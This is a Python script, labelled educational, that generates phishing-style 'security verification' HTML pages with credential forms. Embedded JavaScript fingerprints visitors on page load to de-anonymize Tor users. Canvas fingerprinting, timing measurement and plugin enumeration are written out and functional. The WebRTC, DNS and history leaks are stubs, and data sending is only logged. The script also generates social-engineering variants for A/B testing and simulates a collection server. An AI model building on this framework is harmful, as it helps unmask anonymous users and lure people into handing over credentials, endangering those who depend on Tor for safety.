#!/usr/bin/env python3
# Browser-based Exploitation Module for Tor De-anonymization
# For educational and research purposes only

import os
import json
import random
import string
import logging
import argparse
import datetime
import hashlib
from jinja2 import Template

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("browser_exploit.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("browser_exploit")

# Template for generating the exploit payload
EXPLOIT_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>{{ page_title }}</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background-color: #f8f9fa; }
        .container { max-width: 800px; margin: 0 auto; background-color: white; padding: 20px; border-radius: 5px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        h1 { color: #333; }
        .alert { background-color: #f8d7da; color: #721c24; padding: 10px; border-radius: 5px; margin-bottom: 20px; }
        .img-container { text-align: center; margin: 20px 0; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; }
        button { background-color: #007bff; color: white; border: none; padding: 10px 15px; border-radius: 4px; cursor: pointer; }
        button:hover { background-color: #0069d9; }
        footer { margin-top: 20px; text-align: center; font-size: 0.8em; color: #6c757d; }
    </style>
</head>
<body>
    <div class="container">
        <h1>{{ header_text }}</h1>
        
        {% if show_alert %}
        <div class="alert">
            {{ alert_message }}
        </div>
        {% endif %}
        
        <p>{{ main_content }}</p>
        
        {% if show_image %}
        <div class="img-container">
            <img src="{{ image_url }}" alt="Content Image" style="max-width:100%;">
        </div>
        {% endif %}
        
        {% if show_form %}
        <form id="userForm" onsubmit="return validateForm()">
            <div class="form-group">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Submit</button>
        </form>
        {% endif %}
        
        <footer>
            &copy; {{ current_year }} {{ site_name }} | All Rights Reserved
        </footer>
    </div>
    
    <!-- Exploit Code -->
    <script>
        // Track unique visitors
        const exploitId = "{{ exploit_id }}";
        
        // Utility function to send data to collection server
        function sendData(data) {
            // In a real exploit, this would send data to an attacker-controlled server
            // This is a simulation for educational purposes only
            console.log("Data that would be sent:", data);
            
            // In a real exploit, various exfiltration techniques might be used, such as:
            // 1. Image beacons
            // 2. WebSocket connections
            // 3. Fetch API calls
            // 4. Navigator.sendBeacon
        }
        
        // Gather basic browser information
        function gatherBrowserInfo() {
            return {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                screenDimensions: window.screen.width + "x" + window.screen.height,
                colorDepth: window.screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timeOffset: new Date().getTimezoneOffset(),
                sessionStorage: !!window.sessionStorage,
                localStorage: !!window.localStorage
            };
        }
        
        {% if include_webrtc_exploit %}
        // WebRTC-based IP address leak attempt
        function attemptWebRTCLeak() {
            // This is a demonstration - in a real exploit this would use
            // WebRTC to potentially bypass Tor and reveal the real IP
            
            const webrtcData = { attempted: true, timestamp: new Date().toISOString() };
            
            // In a real exploit, this would use WebRTC's RTCPeerConnection API
            // to establish connections that might bypass Tor
            
            sendData({
                type: "webrtc_leak_attempt",
                exploitId: exploitId,
                data: webrtcData
            });
            
            console.log("WebRTC leak technique demonstrated (no actual leak attempted)");
        }
        {% endif %}
        
        {% if include_dns_exploit %}
        // DNS leak demonstration
        function attemptDNSLeak() {
            // This is a demonstration - in a real exploit this would attempt
            // to force DNS lookups outside the Tor network
            
            const dnsData = { attempted: true, timestamp: new Date().toISOString() };
            
            // In a real exploit, this would use techniques to force DNS lookups
            // that might not go through the Tor network
            
            sendData({
                type: "dns_leak_attempt",
                exploitId: exploitId,
                data: dnsData
            });
            
            console.log("DNS leak technique demonstrated (no actual leak attempted)");
        }
        {% endif %}
        
        {% if include_canvas_fingerprinting %}
        // Canvas fingerprinting technique
        function performCanvasFingerprinting() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                
                // Set canvas dimensions
                canvas.width = 200;
                canvas.height = 50;
                
                // Draw text and shapes with specific styling
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = "#069";
                ctx.fillText("Tor Browser", 2, 15);
                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                ctx.fillText("Fingerprint", 4, 30);
                
                // Add a gradient
                const gradient = ctx.createLinearGradient(0, 0, 200, 0);
                gradient.addColorStop(0, "blue");
                gradient.addColorStop(1, "white");
                ctx.fillStyle = gradient;
                ctx.fillRect(0, 40, 200, 10);
                
                // Get the canvas data URL
                const dataURL = canvas.toDataURL();
                
                // For fingerprinting, normally we'd hash this
                const fingerprint = dataURL; // In a real exploit, this would be hashed
                
                sendData({
                    type: "canvas_fingerprint",
                    exploitId: exploitId,
                    fingerprint: fingerprint.substring(0, 50) + "..." // Truncated for demo
                });
                
                return fingerprint;
            } catch (e) {
                console.error("Error in canvas fingerprinting:", e);
                return null;
            }
        }
        {% endif %}
        
        {% if include_timing_attack %}
        // Timing analysis technique
        function performTimingAnalysis() {
            const timingData = {
                loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
                domInteractive: performance.timing.domInteractive - performance.timing.navigationStart,
                domContentLoaded: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
                measurements: []
            };
            
            // Perform some timing measurements
            for (let i = 0; i < 5; i++) {
                const start = performance.now();
                
                // Do some computation
                let result = 0;
                for (let j = 0; j < 10000; j++) {
                    result += Math.sqrt(j);
                }
                
                const end = performance.now();
                timingData.measurements.push(end - start);
            }
            
            sendData({
                type: "timing_analysis",
                exploitId: exploitId,
                data: timingData
            });
        }
        {% endif %}
        
        {% if include_history_leak %}
        // History leaking technique demonstration
        function attemptHistoryLeak() {
            const historySites = [
                "facebook.com", "twitter.com", "linkedin.com", "youtube.com",
                "amazon.com", "reddit.com", "wikipedia.org", "instagram.com"
            ];
            
            const visitedSites = {};
            
            // In a real exploit, this would use techniques like:
            // 1. CSS :visited selectors with timing attacks
            // 2. Cache timing attacks
            // 3. Other side-channel leaks
            
            // This is just a demonstration
            historySites.forEach(site => {
                visitedSites[site] = "simulated"; // In a real exploit, this would be the actual result
            });
            
            sendData({
                type: "history_leak_attempt",
                exploitId: exploitId,
                data: { sites: visitedSites }
            });
        }
        {% endif %}
        
        {% if include_plugin_enumeration %}
        // Plugin and extension enumeration
        function enumeratePlugins() {
            const pluginData = {
                plugins: [],
                mimeTypes: []
            };
            
            // Check navigator.plugins
            if (navigator.plugins) {
                for (let i = 0; i < navigator.plugins.length; i++) {
                    const plugin = navigator.plugins[i];
                    pluginData.plugins.push({
                        name: plugin.name,
                        description: plugin.description,
                        filename: plugin.filename
                    });
                }
            }
            
            // Check navigator.mimeTypes
            if (navigator.mimeTypes) {
                for (let i = 0; i < navigator.mimeTypes.length; i++) {
                    const mt = navigator.mimeTypes[i];
                    pluginData.mimeTypes.push({
                        type: mt.type,
                        description: mt.description,
                        suffixes: mt.suffixes
                    });
                }
            }
            
            sendData({
                type: "plugin_enumeration",
                exploitId: exploitId,
                data: pluginData
            });
        }
        {% endif %}
        
        // Validate form (cover function)
        function validateForm() {
            // This function is just for show - in a real form it would validate inputs
            alert("Form submission simulated - no data actually sent");
            return false; // Prevent actual form submission
        }
        
        // Initialize on page load
        window.onload = function() {
            setTimeout(function() {
                // Collect basic browser data
                const browserInfo = gatherBrowserInfo();
                
                // Send initial data
                sendData({
                    type: "initial_data",
                    exploitId: exploitId,
                    timestamp: new Date().toISOString(),
                    browserInfo: browserInfo
                });
                
                // Run the various techniques
                {% if include_webrtc_exploit %}
                setTimeout(attemptWebRTCLeak, {{ webrtc_delay }});
                {% endif %}
                
                {% if include_dns_exploit %}
                setTimeout(attemptDNSLeak, {{ dns_delay }});
                {% endif %}
                
                {% if include_canvas_fingerprinting %}
                setTimeout(performCanvasFingerprinting, {{ canvas_delay }});
                {% endif %}
                
                {% if include_timing_attack %}
                setTimeout(performTimingAnalysis, {{ timing_delay }});
                {% endif %}
                
                {% if include_history_leak %}
                setTimeout(attemptHistoryLeak, {{ history_delay }});
                {% endif %}
                
                {% if include_plugin_enumeration %}
                setTimeout(enumeratePlugins, {{ plugin_delay }});
                {% endif %}
            }, 1000);
        };
    </script>
</body>
</html>
"""

class BrowserExploitGenerator:
    """
    Generates browser-based exploitation payloads for educational purposes.
    These demonstrate methods that could potentially de-anonymize Tor users.
    """
    def __init__(self, output_dir="output/browser"):
        self.output_dir = output_dir
        self.exploit_id = self._generate_exploit_id()
        
        # Create output directory if it doesn't exist
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
            
        logger.info(f"Initialized browser exploit generator with ID: {self.exploit_id}")
    
    def _generate_exploit_id(self):
        """Generate a unique ID for the exploit"""
        random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        timestamp = datetime.datetime.now().strftime("%Y%m%d%H%M%S")
        return f"EXP-{timestamp}-{random_part}"
    
    def generate_exploit(self, template_vars=None):
        """Generate a browser exploitation payload based on provided template variables"""
        if template_vars is None:
            template_vars = {}
        
        # Set default template variables
        default_vars = {
            "page_title": "Security Check Required",
            "header_text": "Please Verify Your Identity",
            "main_content": "We've detected unusual activity on your account. Please verify your identity to continue.",
            "show_alert": True,
            "alert_message": "Your account has been temporarily locked due to suspicious activity.",
            "show_image": False,
            "image_url": "",
            "show_form": True,
            "site_name": "Security Center",
            "current_year": datetime.datetime.now().year,
            "exploit_id": self.exploit_id,
            
            # Exploit techniques
            "include_webrtc_exploit": True,
            "webrtc_delay": 2000,
            "include_dns_exploit": True,
            "dns_delay": 3000,
            "include_canvas_fingerprinting": True,
            "canvas_delay": 1500,
            "include_timing_attack": True,
            "timing_delay": 4000,
            "include_history_leak": True,
            "history_delay": 5000,
            "include_plugin_enumeration": True,
            "plugin_delay": 2500
        }
        
        # Merge provided variables with defaults
        for key, value in template_vars.items():
            default_vars[key] = value
        
        # Render the template
        template = Template(EXPLOIT_TEMPLATE)
        rendered_exploit = template.render(**default_vars)
        
        # Save the exploit payload
        output_file = os.path.join(self.output_dir, f"exploit_{self.exploit_id}.html")
        with open(output_file, 'w') as f:
            f.write(rendered_exploit)
            
        # Also save metadata about the exploit
        metadata = {
            "exploit_id": self.exploit_id,
            "creation_time": datetime.datetime.now().isoformat(),
            "techniques": {
                "webrtc": default_vars["include_webrtc_exploit"],
                "dns": default_vars["include_dns_exploit"],
                "canvas": default_vars["include_canvas_fingerprinting"],
                "timing": default_vars["include_timing_attack"],
                "history": default_vars["include_history_leak"],
                "plugins": default_vars["include_plugin_enumeration"]
            },
            "notes": "This is for educational purposes only"
        }
        
        metadata_file = os.path.join(self.output_dir, f"metadata_{self.exploit_id}.json")
        with open(metadata_file, 'w') as f:
            json.dump(metadata, f, indent=2)
            
        logger.info(f"Generated exploit payload: {output_file}")
        logger.info(f"Generated exploit metadata: {metadata_file}")
        
        return {
            "exploit_file": output_file,
            "metadata_file": metadata_file,
            "exploit_id": self.exploit_id
        }
    
    def generate_target_variants(self, target_count=3):
        """Generate multiple variants of the exploit for A/B testing"""
        logger.info(f"Generating {target_count} exploit variants for testing")
        
        variants = []
        
        # Create different variants to see which is most effective
        variant_types = [
            {
                "name": "minimal",
                "description": "Minimal variant with only the most reliable techniques",
                "template_vars": {
                    "page_title": "Account Verification",
                    "header_text": "Verify Your Account",
                    "main_content": "Please complete the verification process to regain access to your account.",
                    "show_alert": False,
                    "show_form": True,
                    "include_webrtc_exploit": True,
                    "include_dns_exploit": False,
                    "include_canvas_fingerprinting": True,
                    "include_timing_attack": False,
                    "include_history_leak": False,
                    "include_plugin_enumeration": False
                }
            },
            {
                "name": "social_engineering",
                "description": "Social engineering focused variant",
                "template_vars": {
                    "page_title": "Urgent Security Alert",
                    "header_text": "IMPORTANT: Security Breach Detected",
                    "main_content": "We've detected unauthorized access to your account. Immediate verification is required to prevent account suspension.",
                    "show_alert": True,
                    "alert_message": "Your account will be locked in 24 hours if verification is not completed.",
                    "show_form": True,
                    "include_webrtc_exploit": True,
                    "include_dns_exploit": True,
                    "include_canvas_fingerprinting": True,
                    "include_timing_attack": True,
                    "include_history_leak": False,
                    "include_plugin_enumeration": True
                }
            },
            {
                "name": "comprehensive",
                "description": "Full suite of deanonymization techniques",
                "template_vars": {
                    "page_title": "Account Security",
                    "header_text": "Security Verification Required",
                    "main_content": "Please complete this security check to confirm your identity.",
                    "show_alert": True,
                    "alert_message": "Unusual activity has been detected on your account.",
                    "show_form": True,
                    "include_webrtc_exploit": True,
                    "include_dns_exploit": True,
                    "include_canvas_fingerprinting": True,
                    "include_timing_attack": True,
                    "include_history_leak": True,
                    "include_plugin_enumeration": True
                }
            }
        ]
        
        # Generate up to the requested number of variants
        for i in range(min(target_count, len(variant_types))):
            variant = variant_types[i]
            
            # Generate this variant
            result = self.generate_exploit(variant["template_vars"])
            
            variants.append({
                "type": variant["name"],
                "description": variant["description"],
                "exploit_id": result["exploit_id"],
                "files": {
                    "exploit": result["exploit_file"],
                    "metadata": result["metadata_file"]
                }
            })
            
        return variants
    
    def simulate_exploitation_server(self):
        """
        Simulate a server receiving data from exploitation attempts
        For educational purposes only
        """
        logger.info("Simulating exploitation data collection server")
        
        # This would represent a server waiting for callbacks from exploited browsers
        # For demonstration purposes, we'll simulate some received data
        
        simulated_data = []
        
        # Simulate some data points
        for i in range(random.randint(3, 8)):
            browser_types = [
                "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
                "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0"
            ]
            
            # Randomly decide if this simulation "succeeded" in getting real data
            is_successful = random.random() < 0.3  # 30% success rate
            
            data_point = {
                "timestamp": (datetime.datetime.now() - datetime.timedelta(minutes=random.randint(5, 60))).isoformat(),
                "exploit_id": self.exploit_id,
                "source_ip": "127.0.0.1" if not is_successful else f"192.168.{random.randint(0, 255)}.{random.randint(1, 254)}",
                "browser_info": {
                    "userAgent": random.choice(browser_types),
                    "language": random.choice(["en-US", "en-GB", "fr", "de", "es"]),
                    "platform": random.choice(["Win32", "Linux x86_64", "MacIntel"]),
                    "screenDimensions": random.choice(["1920x1080", "1366x768", "2560x1440", "1280x800"]),
                    "timezone": random.choice(["Europe/London", "America/New_York", "Asia/Tokyo", "UTC"])
                },
                "techniques": {
                    "webrtc": {
                        "attempted": True,
                        "successful": is_successful,
                        "real_ip": "192.168.86.131" if is_successful else None
                    },
                    "dns": {
                        "attempted": True,
                        "successful": random.random() < 0.2
                    },
                    "canvas_fingerprint": {
                        "attempted": True,
                        "hash": hashlib.md5(str(random.random()).encode()).hexdigest()
                    },
                    "timing_analysis": {
                        "attempted": True,
                        "measurements": [random.uniform(100, 500) for _ in range(5)]
                    }
                },
                "notes": "This is simulated data for educational purposes"
            }
            
            simulated_data.append(data_point)
        
        # Save the simulated data
        output_file = os.path.join(self.output_dir, f"received_data_{self.exploit_id}.json")
        with open(output_file, 'w') as f:
            json.dump(simulated_data, f, indent=2)
            
        logger.info(f"Simulated {len(simulated_data)} received data points, saved to {output_file}")
        
        # Generate a summary of "findings"
        identified_ips = [d["techniques"]["webrtc"]["real_ip"] for d in simulated_data 
                         if d["techniques"]["webrtc"]["successful"] and d["techniques"]["webrtc"]["real_ip"]]
        
        summary = {
            "exploit_id": self.exploit_id,
            "timestamp": datetime.datetime.now().isoformat(),
            "data_points_received": len(simulated_data),
            "successful_deanonymizations": len(identified_ips),
            "identified_ips": identified_ips,
            "notes": "This is simulated data for educational purposes"
        }
        
        # Save the summary
        summary_file = os.path.join(self.output_dir, f"exploitation_summary_{self.exploit_id}.json")
        with open(summary_file, 'w') as f:
            json.dump(summary, f, indent=2)
            
        logger.info(f"Generated exploitation summary: {summary_file}")
        
        return {
            "data_file": output_file,
            "summary_file": summary_file,
            "identified_ips": identified_ips
        }

def main():
    parser = argparse.ArgumentParser(description="Browser Exploitation Generator (For Educational Purposes Only)")
    parser.add_argument("--output", default="output/browser", help="Output directory for exploitation files")
    parser.add_argument("--variants", type=int, default=1, choices=range(1, 4), help="Number of exploit variants to generate")
    parser.add_argument("--simulate-server", action="store_true", help="Simulate exploitation server receiving data")
    parser.add_argument("--technique", choices=["all", "webrtc", "dns", "canvas", "timing", "history", "plugins"],
                       default="all", help="Specific technique to include (default: all)")
    
    args = parser.parse_args()
    
    # Create generator
    generator = BrowserExploitGenerator(args.output)
    
    # Handle specific technique if requested
    if args.technique != "all":
        template_vars = {
            "include_webrtc_exploit": args.technique == "webrtc",
            "include_dns_exploit": args.technique == "dns",
            "include_canvas_fingerprinting": args.technique == "canvas",
            "include_timing_attack": args.technique == "timing",
            "include_history_leak": args.technique == "history",
            "include_plugin_enumeration": args.technique == "plugins"
        }
        result = generator.generate_exploit(template_vars)
        logger.info(f"Generated {args.technique} exploit: {result['exploit_file']}")
    else:
        # Generate requested number of variants
        if args.variants > 1:
            variants = generator.generate_target_variants(args.variants)
            logger.info(f"Generated {len(variants)} exploit variants")
            
            # Print variant info
            for variant in variants:
                print(f"Variant: {variant['type']}")
                print(f"Description: {variant['description']}")
                print(f"Files: {variant['files']['exploit']}")
                print()
        else:
            # Generate a single exploit with all techniques
            result = generator.generate_exploit()
            logger.info(f"Generated exploit: {result['exploit_file']}")
    
    # Simulate server if requested
    if args.simulate_server:
        server_result = generator.simulate_exploitation_server()
        
        # Print findings
        print("\n=== Simulated Exploitation Results ===")
        print(f"Data points received: {len(open(server_result['data_file']).readlines())}")
        print(f"Successful de-anonymizations: {len(server_result['identified_ips'])}")
        if server_result['identified_ips']:
            print(f"Identified IPs: {', '.join(server_result['identified_ips'])}")
        print(f"Full results saved to: {server_result['summary_file']}")

if __name__ == "__main__":
    main() 